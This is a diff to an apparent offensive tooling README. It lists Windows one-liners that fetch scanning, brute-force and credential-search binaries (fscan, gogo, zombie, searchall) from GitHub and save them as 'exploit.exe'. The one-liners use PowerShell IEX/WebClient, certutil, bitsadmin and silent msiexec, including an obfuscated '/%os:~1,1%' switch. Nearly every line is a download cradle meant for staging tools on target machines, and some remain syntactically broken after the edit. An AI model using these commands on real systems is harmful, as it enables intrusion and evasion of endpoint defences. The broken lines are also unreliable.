@@ -46,18 +46,16 @@ Windows
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan32.exe
@@ -69,18 +67,16 @@ Windows arm
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_arm64.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_armv6.exe
@@ -90,18 +86,16 @@ Windows 2003
 
 ```
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03.exe
 
 upx
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan_win03_upx.exe
@@ -147,18 +141,16 @@ Windows amd
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_amd64.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_386.exe
@@ -169,9 +161,8 @@ Windows arm
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm64.exe
@@ -179,9 +170,8 @@ msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/dow
 32
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/gogo/gogo_windows_arm.exe
@@ -222,18 +212,16 @@ Windows amd
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_amd64.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_386.exe
@@ -243,18 +231,16 @@ Windows7 amd
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_amd64.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows7_386.exe
@@ -265,18 +251,16 @@ Windows arm
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm64.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/zombie/zombie_windows_arm.exe
@@ -305,18 +289,16 @@ Windows
 ```
 64
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall64.exe
 
 32
 powershell.exe -Command "Invoke-WebRequest -Uri https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe -OutFile exploit.exe"
-powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe -OutFile exploit.exe', exploit.exe)"
-certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe -OutFile exploit.exe exploit.exe
-copy \\github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/fscan/fscan.exe -OutFile exploit.exe exploit.exe
+powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe exploit.exe', exploit.exe)"
+certutil.exe -urlcache -split -f https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe exploit.exe
 bitsadmin /rawreturn /transfer down "https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe" c:\\exploit.exe
 msiexec /q /i https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe
 msiexec /q /%os:~1,1%https://github.com/JiaoSuInfoSec/heixiongT00ls/releases/download/searchall/searchall32.exe
